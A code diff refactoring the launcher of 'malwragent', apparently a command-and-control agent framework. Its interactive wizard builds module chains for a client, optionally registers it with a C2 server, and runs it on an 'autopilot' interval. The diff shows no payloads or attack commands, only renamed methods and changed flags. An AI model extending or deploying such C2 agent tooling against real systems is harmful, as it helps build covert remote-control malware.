@@ -12,14 +12,13 @@ from termcolor import colored
 from malwragent.packages.helpers.client import Client
 
 # TODO[23/10/2016][bl4ckw0rm]
-# high: run multi optional chains as separate threads
-# medium: multiple config files -> run multiple clients at once
+# medium: multiple config files -> run multiple agents in parallel
 
 """ There is at least a client chain to build """
-_CHAINS_TO_BUILD = ['CLIENT']
+__CHAINS_TO_BUILD = ['CLIENT']
 
 """ Location where chains are stored """
-_CHAIN_STORE = './myChains/'
+__CHAIN_STORE = './myChains/'
 
 
 def print_welcome():
@@ -48,15 +47,15 @@ def do_wizard(modules, config_filename, client):
     # ask for interval
     # ask for random interval
     # TODO ask for custom chains to build additionally to the standard client chain
-
+    # TODO[30/10/2016][bl4ckw0rm] Make either Y/n to default value
     selection = str(
         raw_input('#  Do you want your client to register with C2-Server? (Y|N) \\> ').strip())
     if selection.upper() == 'Y' or selection.upper() == 'YES':
         # prepend to array
-        _CHAINS_TO_BUILD.insert(0, 'REG')
+        __CHAINS_TO_BUILD.insert(0, 'REG')
 
-    for chain in _CHAINS_TO_BUILD:
-        client.add_chain_to_master(chain)
+    for chain in __CHAINS_TO_BUILD:
+        client.init_chain(chain)
 
         if chain == 'REG':
             print "#  Choose from our list of modules. How should your client register with the server?"
@@ -69,13 +68,11 @@ def do_wizard(modules, config_filename, client):
             # Classify module compatibility
             # do only show compatible modules
 
-            # enforce proper chain configuration e.g. which module must not be run first in chain
-
             selection = str(
                 raw_input('#  ([0-9]{n}|[N for NEXT]|[C for CHAIN]|[M for MODULES]) ' + chain + ' \\> ').strip())
 
             if selection.upper() == 'N':
-                if not client.get_chain_length_by_name(chain):
+                if not client.get_chain_length_by_id(chain):
                     print
                     print colored("Chain must not be emtpy. Add some modules to your chain!", 'red')
                     print
@@ -84,7 +81,7 @@ def do_wizard(modules, config_filename, client):
                     break
             elif selection.upper() == 'C':
                 print
-                print client.get_chain_by_name(chain, out_format='table')
+                print client.get_chain_by_id(chain, out_format='table')
                 print
             elif selection.upper() == 'M':
                 print
@@ -111,7 +108,7 @@ def do_wizard(modules, config_filename, client):
 
                 done_add = False
                 while not done_add:
-                    result = client.add_module(chain, selected_module_name, module_args, mode='interactive')
+                    result = client.add_item(chain, selected_module_name, module_args, mode='interactive')
 
                     if result:
                         if result['result']:
@@ -123,6 +120,7 @@ def do_wizard(modules, config_filename, client):
                                 'green')
                             print
                         elif not result['result']:
+                            # TODO[29/10/2016][bl4ckw0rm] move missing arg check to client.py
                             # TODO does this work for multiple arguments ???
                             if result['code'] in [400, 401, 402, 403, 404]:
                                 for missing_arg in result['missing_args'].split(','):
@@ -155,7 +153,7 @@ def do_wizard(modules, config_filename, client):
         raw_input('#  Do you want to review your chain? (Y|N) \\> ').strip())
     if selection.upper() == 'Y' or selection.upper() == 'YES':
         print
-        print client.get_master_chain(out_format='table')
+        print client.get_formatted_chain(out_format='table')
         print
 
     selection = str(
@@ -185,21 +183,16 @@ def main():
     parser.add_argument("-c", "--configfile",
                         help="configuration file name, default: config.json",
                         type=str,
-                        default=_CHAIN_STORE + 'config.json')
+                        default=__CHAIN_STORE + 'config.json')
     parser.add_argument("-i", "--interval",
                         help="interval for periodic chain execution, default: 10 seconds",
                         type=int,
                         default=10)
-    parser.add_argument("--debug",
-                        help="increase debug output verbosity",
-                        type=int,
-                        default=0,
-                        choices=[1, 2, 3])
     parser.add_argument("--log",
                         help="increase logging output verbosity",
                         type=int,
                         default=0,
-                        choices=[1, 2, 3])
+                        choices=[1, 2, 3, 4])
     parser.add_argument('-V', '--version',
                         action='version',
                         version='%(prog)s (version 0.1)')
@@ -214,12 +207,11 @@ def main():
         config_filename += '.json'
     client_name = config_filename.replace('.json', '')
 
-    # TODO debug color print
-    if args.debug > 0:
+    if args.log > 3:
         print "Config filename", config_filename
 
     # TODO create multiple client objects for multiple concurrent running clients
-    client = Client(logging_level=args.log, debug_level=args.debug)
+    client = Client(logging_level=args.log)
 
     if args.load:
         # TODO allow multiple config files
@@ -228,8 +220,13 @@ def main():
 
         try:
             client.load_chain_from_file(filename=config_filename)
+            if client.get_chain_length_by_id('CLIENT') < 1:
+                print
+                print colored('Chain Emtpy ... ?', 'red')
+                print
+                return 1
         except IOError as err:
-            if args.debug > 2:
+            if args.log > 3:
                 print
                 print colored(err, 'red')
                 print
@@ -239,7 +236,7 @@ def main():
                 print
             return 1
 
-        # This is the single sign of execution, when --debug or --log is not provided
+        # This is the single sign of execution, when --log LEVEL is not provided
         print "Autopilot takes over in"
         count = 3
         while count > 0:
@@ -248,7 +245,7 @@ def main():
             time.sleep(1)
 
         client.set_client_interval(args.interval)
-        client.start_agent()
+        client.run_agent()
     elif args.wizard:
         client.set_client_name(client_name)
         print_welcome()
